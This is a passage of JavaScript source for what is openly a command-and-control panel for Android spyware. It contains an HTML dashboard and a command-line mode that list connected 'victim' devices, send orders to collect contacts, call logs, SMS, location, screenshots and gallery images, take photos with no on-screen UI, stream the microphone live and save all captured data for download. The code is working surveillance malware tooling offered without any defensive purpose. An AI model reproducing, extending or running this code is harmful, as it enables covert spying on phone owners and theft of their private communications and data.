    <div class="card" style="margin-top:14px"><h2>Raw order</h2>
      <div class="row"><input type="text" id="raw" placeholder="e.g. lm &middot; fm-ls /storage/emulated/0 &middot; mc 5 &middot; raw {...}">
      <button id="sendraw">Send</button></div>
      <div class="dim" style="font-size:11px;margin-top:6px">photo (no UI): <code>cam-on 0</code> (back) / <code>cam-on 1</code> (front) &middot; apps control: <code>run-app com.android.settings</code></div>
    </div>
    <div class="card" style="margin-top:14px"><h2>Downloads &mdash; captured responses</h2>
      <div id="files" style="max-height:180px;overflow-y:auto"><p class="dim">waiting&hellip;</p></div>
      <div class="dim" style="font-size:11px;margin-top:6px">every response is saved as <code>.json</code> + readable <code>.txt</code> (contacts / calls / SMS / apps)</div>
    </div>
  </div>
  <div class="card"><h2>Live log</h2><div id="log"></div></div>
</main>
<script>
let target=""; let since=0;
const $=id=>document.getElementById(id);
const QUICK=[["apps","apps"],["contacts","cn"],["calls","cl"],["sms","sms"],["cameras","ca"],["location","lm"],["screen","sc"],["photo-back","cam-on 0"],["photo-front","cam-on 1"],["gallery","img-ls"],["mic-live","mic-live"]];
function pollDevices(){fetch("/api/devices").then(r=>r.json()).then(d=>{
  $("count").textContent=d.length+" connected";
  $("devs").innerHTML=d.length?"":"<p class='dim'>no devices</p>";
  d.forEach(x=>{const el=document.createElement("div");el.className="dev"+(x.sid===target?" sel":"");
    el.innerHTML="<div class=top><span class=model>"+esc(x.model||"?")+"</span><span><span class=dot></span>"+esc(x.manf||"?")+" &middot; Android "+esc(x.release||"?")+"</span></div>"+
      "<div class=meta>"+esc(x.sid.slice(0,8))+" &middot; device_id "+esc(x.id||"?")+"</div>"+
      "<div class=btns>"+QUICK.map(function(q){return "<button data-o='"+q[1]+"'>"+q[0]+"</button>";}).join("")+"</div>";
    el.onclick=e=>{target=x.sid;renderDevs();};
    el.querySelectorAll("button").forEach(b=>b.onclick=e=>{e.stopPropagation();order(b.dataset.o);});
    $("devs").appendChild(el);
  });
});}
function renderDevs(){ /* selection highlight is applied during poll */ }
function esc(s){return s.replace(/[&<>"']/g,c=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[c]));}
function order(cmd){fetch("/api/order",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({order:cmd,target})});}
$("sendraw").onclick=()=>{const v=$("raw").value.trim();if(v){order(v);$("raw").value="";}};
$("raw").addEventListener("keydown",e=>{if(e.key==="Enter")$("sendraw").click();});
function pollLog(){fetch("/api/log?since="+since).then(r=>r.json()).then(d=>{
  const L=$("log");const atBottom=L.scrollHeight-L.scrollTop-L.clientHeight<40;
  d.lines.forEach(l=>{const div=document.createElement("div");
    const cls=/pong|DEVICE CONNECTED/.test(l)?"in":/\[<\]|POST <-/.test(l)?"in":/error|reject|FATAL|! /.test(l)?"err":/order ->|ping/.test(l)?"out":"dim";
    div.className=cls;div.textContent=l;L.appendChild(div);});
  while(L.childNodes.length>600)L.removeChild(L.firstChild);
  since=d.next;if(atBottom)L.scrollTop=L.scrollHeight;
});}
function pollFiles(){fetch("/api/files").then(r=>r.json()).then(list=>{
  $("files").innerHTML=list.length?"":"<p class='dim'>no captures yet</p>";
  list.slice(0,40).forEach(f=>{const a=document.createElement("a");a.href=f.url; a.download=f.name;
    a.textContent=f.device.slice(0,14)+" &middot; "+f.order+" &middot; "+(f.size/1024).toFixed(1)+" KB";
    a.className="frow";a.title="GET "+f.url;$("files").appendChild(a);});
});}
setInterval(pollDevices,1500);setInterval(pollLog,1200);setInterval(pollFiles,2500);
pollDevices();pollLog();pollFiles();
</script>
</body>
</html>
`;

// ---------------------------------------------------------------------------
// CLI / smoke mode (no Electron)
// ---------------------------------------------------------------------------

if (require.main === module) {
  const port = parseInt(process.argv.find((a) => /^\d+$/.test(a)) || "42474", 10);
  const smoke = process.argv.includes("--smoke");

  const srv = startServer({
    port,
    onLog: (line) => console.log(line),
    onVictim: () => {},
    onVictimGone: () => {},
    onEvent: (v, name, data) => {
      console.log("    " + JSON.stringify(summarize(data)));
    },
    onAudioChunk: () => {},
  });

  if (smoke) {
    console.log("smoke mode: exiting in 90s");
    setTimeout(() => { srv.stop(); process.exit(0); }, 90000);
  } else {
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    rl.setPrompt("order> ");
    rl.prompt();
    rl.on("line", (line) => {
      const t = line.trim();
      if (!t) return rl.prompt();
      if (t === "quit" || t === "exit") { srv.stop(); process.exit(0); }
      if (t === "help") { console.log(HELP); return rl.prompt(); }
      if (t === "who") {
        const conn = Array.from(srv.victims.values()).filter((d) => d.connected);
        if (!conn.length) console.log("no devices connected");
        for (const d of conn) console.log(`  ${d.sid.slice(0, 8)}  model=${d.info.model} manf=${d.info.manf} android=${d.info.release} id=${d.info.id}`);
        return rl.prompt();
      }
      let payload = null;
      if (t.startsWith("{")) {
        try { payload = JSON.parse(t); } catch (e) { console.log("bad JSON order"); }
      } else {
        const parsed = parseCommand(t);
        if (parsed) payload = parsed.payload;
        else console.log("unknown command - try 'help'");
      }
      if (payload) {
        const n = srv.broadcastOrder(payload);
        console.log(`> order broadcast to ${n} victim(s)`);
      }
      rl.prompt();
    });
  }
}

module.exports = { startServer };
